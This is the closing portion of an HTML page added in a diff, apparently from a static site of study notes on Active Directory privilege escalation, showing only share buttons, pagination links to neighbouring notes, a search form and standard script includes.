+  <a href="https://twitter.com/intent/tweet?text=2+-+AD+Privesc%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrte%2Fadprivesc%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrte%2Fadprivesc%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrte%2Fadprivesc%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/crte/latmov/" class="pagination--pager" title="1 - Lateral Movement
+">Previous</a>
+    
+    
+      <a href="/notes/crte/adpersistence/" class="pagination--pager" title="3 - AD Persistence
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
